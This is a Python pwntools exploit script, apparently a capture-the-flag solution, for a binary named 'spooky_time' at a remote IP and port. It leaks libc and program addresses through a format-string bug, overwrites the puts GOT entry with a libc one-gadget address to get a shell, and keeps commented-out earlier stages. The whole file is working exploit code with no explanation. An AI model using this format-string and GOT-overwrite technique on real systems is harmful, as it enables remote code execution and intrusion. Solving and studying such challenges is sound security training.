#!/usr/bin/env python3

from pwn import *

pwn = './spooky_time'
context.terminal = 'kitty'
gdbscript='''
continue
'''
host,port = "134.122.106.203",31268
elf = context.binary = ELF(pwn)
libc = elf.libc

def pad(string):
	return string + b'\x00'*(299 - len(string))

def conn():
	if args.REMOTE:
		return remote(host,port)
	elif args.GDB:
		return gdb.debug(pwn,gdbscript=gdbscript)
	else:
		return process(pwn)

io = conn()

# ===== 1 stage =====
io.recvuntil(b'scary!\n')
#io.sendline(b'%69$p.%57$p') #libc,elf
io.sendline(b'%69$p.%57$p') #stack,main
io.recvlines(3)

libc_leak, main = io.recvline().strip().split(b'.')
libc_leak = int(libc_leak.decode(),16) - (libc.sym.__libc_start_main + 128)
elf.address = int(main.decode(),16) - elf.sym.main

print(f'leaked addresses: libc={hex(libc_leak)}, main={hex(elf.address)}')

io.recvuntil(b'time..\n')

payload = fmtstr_payload(8, {elf.got.puts : libc_leak + 0xebcf1})
io.sendline(payload)

# # ===== 2 stage =====
# io.recvuntil(b'scary!\n')
# #io.sendline(b'%69$p.%57$p') #libc,elf
# io.sendline(b'%69$p') #stack,main
# io.recvlines(3)
# libc.address = int(io.recvline().strip().decode(),16) - (libc.sym.__libc_start_main + 128)
# print(f'leaked addresses: libc={hex(libc_leak)}')
# io.recvuntil(b'time..\n')
# #fmt = f'%{libc.address + 0xebcf1}s'
# # payload = b'AAAAAAAA' + b'BBBBBBBB' + b'%8$llx'
# payload = fmtstr_payload(8, {libc_leak : elf.sym.main})
# io.sendline(payload)

# # ===== 3 stage =====
# io.recvuntil(b'scary!\n')
# #io.sendline(b'%69$p.%57$p') #libc,elf
# io.sendline(b'/bin/sh\x00') #stack,main

io.interactive()
